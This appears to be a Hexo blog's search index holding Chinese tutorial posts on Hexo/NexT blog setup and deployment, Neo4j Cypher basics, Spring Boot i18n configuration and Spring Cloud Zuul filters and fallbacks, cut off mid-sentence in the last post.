<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[Hexo-笔记]]></title>
    <url>%2Fblog%2F2019%2F01%2F10%2FHexo-%E7%AC%94%E8%AE%B0%2F</url>
    <content type="text"><![CDATA[一、前置条件1、安装Git 下载地址：https://git-scm.com/ 2、安装Node.js 下载地址：http://nodejs.cn/download/ 二、安装Hexo12345678910111213141516171819# 安装 hexonpm install -g hexo# 查看是否安装成功，查看版本号hexo -v# 初始化Hexo，在当前目录下，创建一个文件夹为blog 的博客hexo init blog#生成静态文件hexo generate# 启动,默认访问：http://localhost:4000/hexo s# 清除缓存，和已生成的静态文件hexo clean 三、修改主题以下都是以next主题为例子12# 可以在https://hexo.io/themes/可以查看你喜欢的主题,然后 clone 到themes文件夹下即可,比如next 主题git clone https://github.com/theme-next/hexo-theme-next themes/next 四、配置一、基本配置编辑文件路径站点根目录 /下 _config.yml 字段 说明 title 博客的名称。 subtitle 根据主题的不同，有的会显示有的不会显示。 description 主要用于SEO，告诉搜索引擎一个关于站点的简单描述，通常建议在其中包含网站的关键词。 author 作者名称，用于主题显示文章的作者。 language 语言会对应的解析正在应用的主题中的languages文件夹下的不同语言文件。所以这里的名称要和languages文件夹下的语言文件名称一致。 timezone Asia/Shanghai //可不填写。 二、主题基本配置修改主题配置文件，在菜单项添加以下内容(把注释打开即可)1234567891011121314menu: home: / || home about: /about/ || user tags: /tags/ || tags categories: /categories/ || th archives: /archives/ || archive #schedule: /schedule/ || calendar #sitemap: /sitemap.xml || sitemap #commonweal: /404/ || heartbeat# Enable/Disable menu icons / item badges.menu_settings: icons: false #是否显示Icon badges: false 三、新建页面123hexo new page tagshexo new page abouthexo new page categories 四、设置头像123456789101112# Sidebar Avataravatar: # in theme directory(source/images): /images/avatar.gif # in site directory(source/uploads): /uploads/avatar.gif # You can also use other linking images. url: #你的头像地址 # If true, the avatar would be dispalyed in circle. rounded: false # The value of opacity should be choose from 0 to 1 to set the opacity of the avatar. opacity: 1 # If true, the avatar would be rotated with the cursor. rotated: false 五、修改底部去掉 由 Hexo 强力驱动 v3.8.0 | 主题 – NexT.Muse v6.7.0打开主题的_config.yml 配置文件，找到如下信息，把enable:true 改为 enable:false把powered 与1234567891011121314151617181920# If not defined, `author` from Hexo main config will be used.copyright:# -------------------------------------------------------------powered: # Hexo link (Powered by Hexo). enable: false # Version info of Hexo after Hexo link (vX.X.X). version: truetheme: # Theme &amp; scheme info link (Theme - NexT.scheme). enable: false # Version info of NexT after scheme info (vX.X.X). version: true# -------------------------------------------------------------# Beian icp information for Chinese users. In China, every legal website should have a beian icp in website footer.# http://www.miitbeian.gov.cnbeian: enable: false icp: 六、添加顶部加载在\themes\next\layout\_custom head.swig文件中添加如下代码123456789101112131415&lt;script src="//cdn.bootcss.com/pace/1.0.2/pace.min.js"&gt;&lt;/script&gt;&lt;link href="//cdn.bootcss.com/pace/1.0.2/themes/pink/pace-theme-flash.css" rel="stylesheet"&gt;&lt;style&gt; .pace .pace-progress &#123; background: #1E92FB; /*进度条颜色*/ height: 3px; &#125; .pace .pace-progress-inner &#123; box-shadow: 0 0 10px #1E92FB, 0 0 5px #1E92FB; /*阴影颜色*/ &#125; .pace .pace-activity &#123; border-top-color: #1E92FB; /*上边框颜色*/ border-left-color: #1E92FB; /*左边框颜色*/ &#125;&lt;/style&gt; 七、文章添加阴影在 themes\next\source\css\_custom\custom.styl 添加如下代码12345678// 主页文章添加阴影效果 .post &#123; margin-top: 60px; margin-bottom: 60px; padding: 25px; -webkit-box-shadow: 0 0 5px rgba(202, 203, 203, .5); -moz-box-shadow: 0 0 5px rgba(202, 203, 204, .5); &#125; 八、在文章末尾添加“文章结束”标记1、在路径 \themes\next\layout\_macro 文件夹中新建 passage-end-tag.swig 文件添加内容如下12345&lt;div&gt; &#123;% if not is_index %&#125; &lt;div style="text-align:center;color: #ccc;font-size:14px;"&gt;-------------本文结束&lt;i class="fa fa-paw"&gt;&lt;/i&gt;感谢您的阅读-------------&lt;/div&gt; &#123;% endif %&#125;&lt;/div&gt; 2、打开\themes\next\layout_macro\post.swig文件，在post-body后，post-footer前，添加下面内容：添加内容如下12345&lt;div&gt; &#123;% if not is_index %&#125; &#123;% include 'passage-end-tag.swig' %&#125; &#123;% endif %&#125;&lt;/div&gt; 放的位置如下：12345678910 &#123;#####################&#125; &#123;### END POST BODY ###&#125; &#123;#####################&#125; &lt;div&gt;&#123;% if not is_index %&#125;&#123;% include &apos;passage-end-tag.swig&apos; %&#125;&#123;% endif %&#125;&lt;/div&gt; 3、打开主题配置文件（_config.yml),在末尾添加：123# 文章末尾添加“本文结束”标记passage_end_tag: enabled: true 如果出现乱码，记得把 passage-end-tag.swig 文件 用类似 Notepad++ 的工具转成UTF-8 九、底部标签样式修改\themes\next\layout\_macro\post.swig 中文件，command+f搜索rel=&quot;tag&quot;&gt;#，将#替换成,修改后，片段代码如下：12345678&lt;footer class=&quot;post-footer&quot;&gt; &#123;% if post.tags and post.tags.length and not is_index %&#125; &lt;div class=&quot;post-tags&quot;&gt; &#123;% for tag in post.tags %&#125; &lt;a href=&quot;&#123;&#123; url_for(tag.path) &#125;&#125;&quot; rel=&quot;tag&quot;&gt;&lt;i class=&quot;fa fa-tag&quot;&gt;&lt;/i&gt; &#123;&#123; tag.name &#125;&#125;&lt;/a&gt; &#123;% endfor %&#125; &lt;/div&gt; &#123;% endif %&#125; 十、文章底部加版权1、手动修改主题目录下的 \themes\next\layout\_macro\post.swig 文件，找到 post-footer 所在的标签，添加以下内容：123456789101112131415161718&lt;div&gt; &#123;# 此处判断是否在索引列表中 #&#125; &#123;% if not is_index %&#125;&lt;ul class=&quot;post-copyright&quot;&gt; &lt;li class=&quot;post-copyright-author&quot;&gt; &lt;strong&gt;本文作者：&lt;/strong&gt;&#123;&#123; theme.author &#125;&#125; &lt;/li&gt; &lt;li class=&quot;post-copyright-link&quot;&gt; &lt;strong&gt;本文链接：&lt;/strong&gt; &lt;a href=&quot;&#123;&#123; url_for(page.path) &#125;&#125;&quot; title=&quot;&#123;&#123; page.title &#125;&#125;&quot;&gt;&#123;&#123; page.path &#125;&#125;&lt;/a&gt; &lt;/li&gt; &lt;li class=&quot;post-copyright-license&quot;&gt; &lt;strong&gt;版权： &lt;/strong&gt; 转载注明出处！ &lt;/li&gt;&lt;/ul&gt;&#123;% endif %&#125;&lt;/div&gt; 2、添加样式在 \themes\next\source\css\_custom\custom.styl 文件,添加如下内容：1234567.post-copyright &#123; margin: 1em 0 0; padding: 0.5em 1em; border-left: 3px solid #ff1700; background-color: #f9f9f9; list-style: none;&#125; 十一、添加评论注册Leancloud 官网：https://leancloud.cn/ 修改主题配置文件_config.xml 查找Valine ,如下：123456789101112# You can get your appid and appkey from https://leancloud.cn# More info available at https://valine.js.orgvaline: enable: true # When enable is set to be true, leancloud_visitors is recommended to be closed for the re-initialization problem within different leancloud adk version. appid: 你的appid # your leancloud application appid appkey: 你的appkey # your leancloud application appkey notify: false # mail notifier, See: https://github.com/xCss/Valine/wiki verify: false # Verification code placeholder: 来都来了，不说几句就走，过分了啊！！！ # comment box placeholder avatar: mm # gravatar style guest_info: nick,mail,link # custom comment header pageSize: 10 # pagination size 十二、压缩12# 安装依赖npm i gulp gulp-debug gulp-clean-css gulp-uglify gulp-htmlmin gulp-htmlclean gulp-imagemin gulp-changed gulp-if gulp-plumber run-sequence del -s 在根目录下创建gulpfile.js文件。编辑内容如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150var gulp = require('gulp');var debug = require('gulp-debug');var cleancss = require('gulp-clean-css'); //css压缩组件var uglify = require('gulp-uglify'); //js压缩组件var htmlmin = require('gulp-htmlmin'); //html压缩组件var htmlclean = require('gulp-htmlclean'); //html清理组件var imagemin = require('gulp-imagemin'); //图片压缩组件var changed = require('gulp-changed'); //文件更改校验组件var gulpif = require('gulp-if') //任务 帮助调用组件var plumber = require('gulp-plumber'); //容错组件（发生错误不跳出任务，并报出错误内容）var runSequence = require('run-sequence'); //异步执行组件var isScriptAll = true; //是否处理所有文件，(true|处理所有文件)(false|只处理有更改的文件)var isDebug = true; //是否调试显示 编译通过的文件var del = require('del');var Hexo = require('hexo');var hexo = new Hexo(process.cwd(), &#123;&#125;); // 初始化一个hexo对象// 清除public文件夹gulp.task('clean', function() &#123; return del(['public/**/*']);&#125;);// 下面几个跟hexo有关的操作，主要通过hexo.call()去执行，注意return// 创建静态页面 （等同 hexo generate）gulp.task('generate', function() &#123; return hexo.init().then(function() &#123; return hexo.call('generate', &#123; watch: false &#125;).then(function() &#123; return hexo.exit(); &#125;).catch(function(err) &#123; return hexo.exit(err); &#125;); &#125;);&#125;);// 启动Hexo服务器gulp.task('server', function() &#123; return hexo.init().then(function() &#123; return hexo.call('server', &#123;&#125;); &#125;).catch(function(err) &#123; console.log(err); &#125;);&#125;);// 部署到服务器gulp.task('deploy', function() &#123; return hexo.init().then(function() &#123; return hexo.call('deploy', &#123; watch: false &#125;).then(function() &#123; return hexo.exit(); &#125;).catch(function(err) &#123; return hexo.exit(err); &#125;); &#125;);&#125;);// 压缩public目录下的js文件gulp.task('compressJs', function () &#123; var option = &#123; // preserveComments: 'all',//保留所有注释 mangle: true, //类型：Boolean 默认：true 是否修改变量名 compress: true //类型：Boolean 默认：true 是否完全压缩 &#125; return gulp.src(['./public/**/*.js','!./public/**/*.min.js']) //排除的js .pipe(gulpif(!isScriptAll, changed('./public'))) .pipe(gulpif(isDebug,debug(&#123;title: 'Compress JS:'&#125;))) .pipe(plumber()) .pipe(uglify(option)) //调用压缩组件方法uglify(),对合并的文件进行压缩 .pipe(gulp.dest('./public')); //输出到目标目录&#125;);// 压缩public目录下的css文件gulp.task('compressCss', function () &#123; var option = &#123; rebase: false, //advanced: true, //类型：Boolean 默认：true [是否开启高级优化（合并选择器等）] compatibility: 'ie7', //保留ie7及以下兼容写法 类型：String 默认：''or'*' [启用兼容模式； 'ie7'：IE7兼容模式，'ie8'：IE8兼容模式，'*'：IE9+兼容模式] //keepBreaks: true, //类型：Boolean 默认：false [是否保留换行] //keepSpecialComments: '*' //保留所有特殊前缀 当你用autoprefixer生成的浏览器前缀，如果不加这个参数，有可能将会删除你的部分前缀 &#125; return gulp.src(['./public/**/*.css','!./public/**/*.min.css']) //排除的css .pipe(gulpif(!isScriptAll, changed('./public'))) .pipe(gulpif(isDebug,debug(&#123;title: 'Compress CSS:'&#125;))) .pipe(plumber()) .pipe(cleancss(option)) .pipe(gulp.dest('./public'));&#125;);// 压缩public目录下的html文件gulp.task('compressHtml', function () &#123; var cleanOptions = &#123; protect: /&lt;\!--%fooTemplate\b.*?%--&gt;/g, //忽略处理 unprotect: /&lt;script [^&gt;]*\btype="text\/x-handlebars-template"[\s\S]+?&lt;\/script&gt;/ig //特殊处理 &#125; var minOption = &#123; collapseWhitespace: true, //压缩HTML collapseBooleanAttributes: true, //省略布尔属性的值 &lt;input checked="true"/&gt; ==&gt; &lt;input /&gt; removeEmptyAttributes: true, //删除所有空格作属性值 &lt;input id="" /&gt; ==&gt; &lt;input /&gt; removeScriptTypeAttributes: true, //删除&lt;script&gt;的type="text/javascript" removeStyleLinkTypeAttributes: true,//删除&lt;style&gt;和&lt;link&gt;的type="text/css" removeComments: true, //清除HTML注释 minifyJS: true, //压缩页面JS minifyCSS: true, //压缩页面CSS minifyURLs: true //替换页面URL &#125;; return gulp.src('./public/**/*.html') .pipe(gulpif(isDebug,debug(&#123;title: 'Compress HTML:'&#125;))) .pipe(plumber()) .pipe(htmlclean(cleanOptions)) .pipe(htmlmin(minOption)) .pipe(gulp.dest('./public'));&#125;);// 压缩 public/uploads 目录内图片gulp.task('compressImage', function() &#123; var option = &#123; optimizationLevel: 5, //类型：Number 默认：3 取值范围：0-7（优化等级） progressive: true, //类型：Boolean 默认：false 无损压缩jpg图片 interlaced: false, //类型：Boolean 默认：false 隔行扫描gif进行渲染 multipass: false //类型：Boolean 默认：false 多次优化svg直到完全优化 &#125; return gulp.src('./public/uploads/**/*.*') .pipe(gulpif(!isScriptAll, changed('./public/uploads'))) .pipe(gulpif(isDebug,debug(&#123;title: 'Compress Images:'&#125;))) .pipe(plumber()) .pipe(imagemin(option)) .pipe(gulp.dest('./public/uploads'));&#125;);// 用run-sequence并发执行，同时处理html，css，js，imggulp.task('compress', function(cb) &#123; runSequence.options.ignoreUndefinedTasks = true; runSequence(['compressHtml', 'compressCss', 'compressJs'],cb);&#125;);// 执行顺序： 清除public目录 -&gt; 产生原始博客内容 -&gt; 执行压缩混淆 -&gt; 部署到服务器gulp.task('build', function(cb) &#123; runSequence.options.ignoreUndefinedTasks = true; runSequence('clean', 'generate', 'compress', 'deploy', cb);&#125;);// 默认任务gulp.task('default', gulp.series('clean','generate', gulp.parallel('compressHtml','compressCss','compressImage') )); 十三、Hexo 新建文章插入图片安装图片插件1npm install hexo-asset-image --save 如果控制台出现如下信息 12found 1 low severity vulnerability run `npm audit fix` to fix them, or `npm audit` for details 记得修复相关介绍如下 npm audit ： npm@5.10.0 &amp; npm@6，允许开发人员分析复杂的代码，并查明特定的漏洞和缺陷。npm audit fix ：npm@6.1.0, 检测项目依赖中的漏洞并自动安装需要更新的有漏洞的依赖，而不必再自己进行跟踪和修复。 修复12# 修复命令npm audit fix 插入图片当插件安装成功后，你新建文章例：hexo new &quot;Hexo笔记&quot;，则在\source\_posts 会有一个名为 Hexo笔记 的文件夹只需把图片放里面即可引用1、把主页配置文件 _config.yml 里的post_asset_folder:这个选项设置为 true2、然后只需要在 Hexo笔记.md 中按照markdown的格式引入图片：![你想输入的替代文字](/Hexo笔记/你要引用的图片名称.jpg) 十四、添加本地搜索1、安装插件1npm install hexo-generator-searchdb --save 2、站点配置文件_config.yml在最后编辑或添加如下信息：12345search: path: search.xml field: post format: html limit: 5000 3、打开主题配置文件在\themes\next\_config.yml 查找local_search 修改如下12local_search: enable: true 五、部署到GitHub准备工作在Github 创建一个仓库为blog,并从master 分支，新建一个dev分支dev 分支就是我们的源代码分支，master,就是我们生成的静态文件。 一、安装Git部署插件12# 安装git 部署插件npm install hexo-deployer-git --save 二、修改站点配置文件修改 配置文件 _config.yml 在deploy 选项,修改如下123456# Deployment## Docs: https://hexo.io/docs/deployment.htmldeploy: type: git repo: https://github.com/rstyro/blog.git # 你的github 仓库地址 branch: master 三、多台终端部署123456789# 此时在另一终端更新博客，只需要将Github的dev分支clone下来，进行初次的相关配置git clone -b dev https://github.com/rstyro/blog.git //将Github中hexo分支clone到本地cd blog //切换到刚刚clone的文件夹内npm install //注意，这里一定要切换到刚刚clone的文件夹内执行，安装必要的所需组件，不用再inithexo new post "new blog name" //新建一个.md文件，并编辑完成自己的博客内容git add source //经测试每次只要更新sorcerer中的文件到Github中即可，因为只是新建了一篇新博客git commit -m "XX"git push origin hexo //更新分支hexo d -g //push更新完分支之后将自己写的博客对接到自己搭的博客网站上，同时同步了Github中的master 参考链接：http://theme-next.iissnan.com]]></content>
      <categories>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>Hexo</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Neo4j 小记]]></title>
    <url>%2Fblog%2F2018%2F10%2F17%2FNeo4j%20%E5%B0%8F%E8%AE%B0%2F</url>
    <content type="text"><![CDATA[Neo4j下载地址配置环境变量：NEO4J_HOME把neo4j 安装为服务1234567891011121314151617# 安装服务neo4j install-service# 卸载服务neo4j uninstall-service# 启动neo4j start# 停止neo4j stop # 重启neo4j restart# 查询服务状态neo4j status 默认的host是bolt://localhost:7687，默认的用户是neo4j，其默认的密码是：neo4j，第一次成功登陆到Neo4j服务器之后，需要重置密码。 访问Graph Database需要输入身份验证，Host是Bolt协议标识的主机。1234567891011121314151617# 创建一个 Person 对象，别名为a, 名字为 rstyro,年龄为23，性别 男create (a:Person&#123;name:&quot;rstyro&quot;,age:23,sex:&quot;男&quot;&#125;);create (a:Person&#123;name:&quot;rstyro&quot;,age:23,sex:&quot;男&quot;&#125;) return a;# 一次创建多个 对象，create (a:Person&#123;name:&quot;rstyro&quot;,age:23,sex:&quot;男&quot;&#125;),(b:Person&#123;name:&quot;老婆&quot;,age:21,sex:&quot;女&quot;&#125;);create (a:Person&#123;name:&quot;rstyro&quot;,age:23,sex:&quot;男&quot;&#125;),(b:Person&#123;name:&quot;老婆&quot;,age:21,sex:&quot;女&quot;&#125;) return a,b;# 修改对象，name 为rstyro 的，修改 age 属性为 168match (a:Person&#123;name:&quot;rstyro&quot;&#125;) set a.age=168;# 删除，清库MATCH (n) DETACH DELETE n ;# 删除 对象，name 为rstyro的match (n:Person&#123;name:&quot;rstyro&quot;&#125;) delete n; 创建关系1234567891011121314151617181920create (a:Person&#123;name:&quot;大佬&quot;,sex:&quot;man&quot;&#125;),(b:Person&#123;name:&quot;22222&quot;,sex:&quot;female&quot;&#125;),(c:Person&#123;name:&quot;3333&quot;,sex:&quot;female&quot;&#125;) return a,b,c;create (p3:Person&#123;name:&quot;4444&quot;,sex:&quot;man&quot;&#125;) return p3;# 创建两个关系 DIRECTED 、ACTED_INMATCH (oliver:Person &#123; name: &apos;3333&apos; &#125;),(reiner:Person &#123; name: &apos;22222&apos; &#125;)MERGE (oliver)-[:DIRECTED]-&gt;(movie:Person &#123;name:&quot;4444&quot;,sex:&quot;man&quot;&#125;)&lt;-[:ACTED_IN]-(reiner)RETURN movie# 创建兄弟关系的A、B节点match(a),(b) where a.id=&apos;502208330941468673&apos; and b.id=&apos;502208330941468672&apos; create (a)-[r:兄弟 &#123;&#125;]-&gt;(b)# 删除 name=3333 的所有关系链match (n:Person&#123;name:&quot;3333&quot;&#125;)-[r]-(m:Person) delete r;# 删除 name=3333 的所有关系链,和其本身节点match (n:Person&#123;name:&quot;3333&quot;&#125;)-[r]-(m:Person) delete r,n;# 删除 name=3333 的所有关系链与本身节点和相关联的节点match (n:Person&#123;name:&quot;3333&quot;&#125;)-[r]-(m:Person) delete r,n,m;]]></content>
      <categories>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>干货</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SpringBoot(十四)：SpringBoot 国际化配置]]></title>
    <url>%2Fblog%2F2018%2F07%2F26%2FSpringBoot(%E5%8D%81%E5%9B%9B)%EF%BC%9ASpringBoot%20%E5%9B%BD%E9%99%85%E5%8C%96%E9%85%8D%E7%BD%AE%2F</url>
    <content type="text"><![CDATA[SpringBoot 国际化配置一、配置LocaleResolver1234567891011121314151617181920212223242526@Configurationpublic class LocaleConfig extends WebMvcConfigurerAdapter&#123; @Bean public LocaleResolver localeResolver() &#123; SessionLocaleResolver slr = new SessionLocaleResolver(); // 默认语言 slr.setDefaultLocale(Locale.CHINA); return slr; &#125; @Bean public LocaleChangeInterceptor localeChangeInterceptor() &#123; LocaleChangeInterceptor lci = new LocaleChangeInterceptor(); // 参数名 lci.setParamName(&quot;lang&quot;); return lci; &#125; @Override public void addInterceptors(InterceptorRegistry registry) &#123; registry.addInterceptor(localeChangeInterceptor()); super.addInterceptors(registry); &#125;&#125; 二、创建国际化文件123456789101112messages.propertiesmessages_zh_CN.propertiesmessages_en_US.propertiesmessages_ja_JP.properties...内容如下：top.lrshuai.text=简体top.lrshuai.name=帅哥top.lrshuai.age=20message=国际化 三、配置国际化文件路径在application.yml 配置国际化文件所在位置12345spring: messages: encoding: UTF-8 cache-seconds: 1 basename: static/i18n/messages 四、前端调用123456789101112131415161718192021222324&lt;body&gt; &lt;div class=&quot;language&quot;&gt; &lt;div th:switch=&quot;$&#123;#locale.getCountry()&#125;&quot;&gt; &lt;span th:case=&quot;&apos;CN&apos;&quot; &gt;简体中文&lt;/span&gt; &lt;span th:case=&quot;&apos;TW&apos;&quot; &gt;繁體中文&lt;/span&gt; &lt;span th:case=&quot;&apos;US&apos;&quot; &gt;English&lt;/span&gt; &lt;span th:case=&quot;&apos;JP&apos;&quot; &gt;日语&lt;/span&gt; &lt;span th:case=&quot;&apos;KR&apos;&quot; &gt;韩语&lt;/span&gt; &lt;/div&gt; &lt;ul class=&quot;langBody&quot;&gt; &lt;li&gt;&lt;a href=&quot;?lang=zh_CN&quot;&gt;简体中文&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href=&quot;?lang=zh_TW&quot;&gt;繁體中文&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href=&quot;?lang=en_US&quot;&gt;English&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href=&quot;?lang=ja_JP&quot;&gt;日语&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href=&quot;?lang=ko_KR&quot;&gt;韩语&lt;/a&gt;&lt;/li&gt; &lt;/ul&gt; &lt;/div&gt; &lt;div class=&quot;language&quot;&gt; &lt;div th:text=&quot;#&#123;top.lrshuai.text&#125;&quot;&gt;asdfSW&lt;/div&gt; &lt;div th:text=&quot;#&#123;top.lrshuai.name&#125;&quot;&gt;asdf&lt;/div&gt; &lt;div th:text=&quot;#&#123;top.lrshuai.age&#125;&quot;&gt;asdf&lt;/div&gt; &lt;span th:text=&quot;#&#123;message&#125;&quot;&gt;ffff&lt;/span&gt;&lt;br/&gt; &lt;/div&gt;&lt;/body&gt; 五、对@ResponseBody 接口返回值拦截有一种需求就是对接口的返回值进行拦截,我们需要实现ResponseBodyAdvice&lt;T&gt; 接口，代码如下12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849/*** 别忘了加注解，basePackages 是对哪些包进行扫描*/@ControllerAdvice(basePackages=&#123;&quot;top.lrshuai.controller&quot;&#125;)public class I18nResponseAdvice implements ResponseBodyAdvice&lt;Object&gt; &#123; protected Logger log = LoggerFactory.getLogger(this.getClass()); @Override public boolean supports(MethodParameter returnType, Class&lt;? extends HttpMessageConverter&lt;?&gt;&gt; converterType) &#123; return true; &#125; /** *这个方法获取到返回数据，对其进行拦截修改即可 */ @Override public Object beforeBodyWrite(Object body, MethodParameter returnType, MediaType selectedContentType, Class&lt;? extends HttpMessageConverter&lt;?&gt;&gt; selectedConverterType, ServerHttpRequest request, ServerHttpResponse response) &#123; try &#123; //body 就是返回的数据体 HttpServletRequest req = ((ServletRequestAttributes)RequestContextHolder.getRequestAttributes()).getRequest(); String value = getMessage(req, &quot;name&quot;); //TODO &#125; catch (Exception e) &#123; e.printStackTrace(); log.error(&quot;返回值国际化拦截异常&quot;,e); &#125; return body; &#125; /** * 返回国际化的值 * @param request * @param key * @return */ public String getMessage(HttpServletRequest request, String key)&#123; RequestContext requestContext = new RequestContext(request); String value = requestContext.getMessage(key); return value; &#125;&#125; Github地址]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Spring Boot</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SpringCloud （十）、Zuul 过滤器]]></title>
    <url>%2Fblog%2F2018%2F05%2F27%2FSpringCloud%20%EF%BC%88%E5%8D%81%EF%BC%89%E3%80%81Zuul%20%E8%BF%87%E6%BB%A4%E5%99%A8%2F</url>
    <content type="text"><![CDATA[Zuul 过滤器Zuul大部分功能都是通过过滤器来实现的。Zuul中定义了四种标准过滤器类型，这些过滤器类型对应于请求的典型生命周期。 PRE：这种过滤器在请求被路由之前调用。我们可利用这种过滤器实现身份验证、在集群中选择请求的微服务、记录调试信息等。 ROUTING：这种过滤器将请求路由到微服务。这种过滤器用于构建发送给微服务的请求，并使用Apache HttpClient或Netfilx Ribbon请求微服务。 POST：这种过滤器在路由到微服务以后执行。这种过滤器可用来为响应添加标准的HTTP Header、收集统计信息和指标、将响应从微服务发送给客户端等。 ERROR：在其他阶段发生错误时执行该过滤器。 除了默认的过滤器类型，Zuul还允许我们创建自定义的过滤器类型。例如，我们可以定制一种STATIC类型的过滤器，直接在Zuul中生成响应，而不将请求转发到后端的微服务。 下面讲的主要是zuul1.x SpringCloud 启动过滤器，有两个注解@EnableZuulServer、@EnableZuulProxy一、@EnableZuulServer过滤器1、pre类型过滤器 ServletDetectionFilter：该过滤器用于检查请求是否通过Spring Dispatcher。检查后，通过isDispatcherServletRequest设置布尔值。 FormBodyWrapperFilter：解析表单数据，并为请求重新编码。 DebugFilter：顾名思义，调试用的过滤器，可以通过zuul.debug.request=true，或在请求时，加上debug=true的参数，例如$ZUUL_HOST:ZUUL_PORT/path?debug=true 开启该过滤器。这样，该过滤器就会把RequestContext.setDebugRouting() 、RequestContext.setDebugRequest()设为true。 2、route类型过滤器SendForwardFilter：该过滤器使用Servlet RequestDispatcher转发请求，转发位置存储在RequestContext.getCurrentContext().get(&quot;forward.to&quot;) 中。可以将路由设置成：12345zuul: routes: abc: path: /abc/** url: forward:/abc 然后访问$ZUUL_HOST:ZUUL_PORT/abc ，观察该过滤器的执行过程。 3、post类型过滤器SendResponseFilter：将Zuul所代理的微服务的的响应写入当前响应。 4、error类型过滤器SendErrorFilter：如果RequestContext.getThrowable() 不为null，那么默认就会转发到/error，也可以设置error.path属性修改默认的转发路径。 二、@EnableZuulProxy过滤器如果使用注解@EnableZuulProxy，那么除上述过滤器之外，Spring Cloud还会安装以下过滤器： 一、pre类型过滤器PreDecorationFilter：该过滤器根据提供的RouteLocator确定路由到的地址，以及怎样去路由。该路由器也可为后端请求设置各种代理相关的header。 二、route类型过滤器 RibbonRoutingFilter：该过滤器使用Ribbon，Hystrix和可插拔的HTTP客户端发送请求。serviceId在RequestContext.getCurrentContext().get(&quot;serviceId&quot;) 中。该过滤器可使用不同的HTTP客户端，例如Apache HttpClient：默认的HTTP客户端Squareup OkHttpClient v3：如需使用该客户端，需保证com.squareup.okhttp3的依赖在classpath中，并设置ribbon.okhttp.enabled = true 。Netflix Ribbon HTTP client：设置ribbon.restclient.enabled = true 即可启用该HTTP客户端。需要注意的是，该客户端有一定限制，例如不支持PATCH方法，另外，它有内置的重试机制。 SimpleHostRoutingFilter：该过滤器通过Apache HttpClient向指定的URL发送请求。URL在RequestContext.getRouteHost() 中。 自定义过滤器的代码示例1、自定义一个过滤器 MyPreZuulFileter12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152@Componentpublic class MyPreZuulFileter extends ZuulFilter&#123; @Override public Object run() &#123; System.out.println(&quot;这个就是你要过滤的重要方法&quot;); System.out.println(&quot;可以在这里写你的过滤逻辑&quot;); System.out.println(&quot;比如下面的demo&quot;); RequestContext context = RequestContext.getCurrentContext(); HttpServletResponse servletResponse = context.getResponse(); servletResponse.addHeader(&quot;X-Foo&quot;, UUID.randomUUID().toString()); return null; &#125; /** * 是否使用这个过滤器，true -- 使用 */ @Override public boolean shouldFilter() &#123; return true; &#125; /** * 执行顺序，返回的数字越大越靠后 */ @Override public int filterOrder() &#123; return 7; &#125; /** * 过滤的类型 */ @Override public String filterType() &#123; // TODO Auto-generated method stub /** * 有4种： * pre * post * route * error * * 可以看spring-clou-netflix-core-1.3.6RELEASE.jar下的 * org.springframework.cloud.netflix.zuul.filters.support.FilterConstants 这个类 * */ return &quot;pre&quot;; &#125; &#125; 2、加注解在启动类加@EnableZuulProxy注解,并注入上面自定义的bean1234567891011121314@SpringBootApplication@EnableZuulProxypublic class SpringcloudZuulFilterApplication &#123; public static void main(String[] args) &#123; SpringApplication.run(SpringcloudZuulFilterApplication.class, args); &#125; @Bean public MyPreZuulFileter myPreZuulFileter() &#123; return new MyPreZuulFileter(); &#125; &#125; 完整的 Github代码地址请求服务时，拦截 参考链接：https://github.com/Netflix/zuul/wiki/How-It-Works、http://www.itmuch.com/spring-cloud/zuul/zuul-filter-in-spring-cloud/]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>SpringCloud</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SpringCloud （九）、Zuul 回退]]></title>
    <url>%2Fblog%2F2018%2F05%2F27%2FSpringCloud%20%EF%BC%88%E4%B9%9D%EF%BC%89%E3%80%81Zuul%20%E5%9B%9E%E9%80%80%2F</url>
    <content type="text"><![CDATA[一、Zuul 的回退Zuul 本身就有断路器的功能很简单只需自定义一个ZuulFallbackProvider即可，在实现这个ZuulFallbackProvider的getRoute()方法中定义你的服务名称。下面是简单的示例我这个是producer这个微服务的fallback1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556@Componentpublic class MyFallbackProvider implements ZuulFallbackProvider &#123; /** * 这个是你要配置的是那个微服务 */ @Override public String getRoute() &#123; return &quot;producer&quot;; &#125; /** * 这个是服务器端返回的数据体， * 可以自己定义重写 */ @Override public ClientHttpResponse fallbackResponse() &#123; return new ClientHttpResponse() &#123; @Override public HttpStatus getStatusCode() throws IOException &#123; return HttpStatus.OK; &#125; @Override public int getRawStatusCode() throws IOException &#123; return 200; &#125; @Override public String getStatusText() throws IOException &#123; return &quot;OK&quot;; &#125; @Override public void close() &#123; &#125; /** * fallback 返回的信息 */ @Override public InputStream getBody() throws IOException &#123; return new ByteArrayInputStream(&quot;这个就是当服务掉掉的时候，返回的是这个数据&quot;.getBytes(&quot;utf-8&quot;)); &#125; @Override public HttpHeaders getHeaders() &#123; HttpHeaders headers = new HttpHeaders(); headers.setContentType(MediaType.APPLICATION_JSON); return headers; &#125; &#125;; &#125;&#125; 我上面这个是Dalston.SR5 版本的，为什么用这个版本，刚学的时候，感觉这个版本名称比较亲切不知道为啥。 如果 Edgware及更高版本的话，回退是这样的FallbackProvider是ZuulFallbackProvider的子接口。ZuulFallbackProvider已经被标注Deprecated，很可能在未来的版本中被删除。FallbackProvider接口比ZuulFallbackProvider多了一个ClientHttpResponse fallbackResponse(Throwable 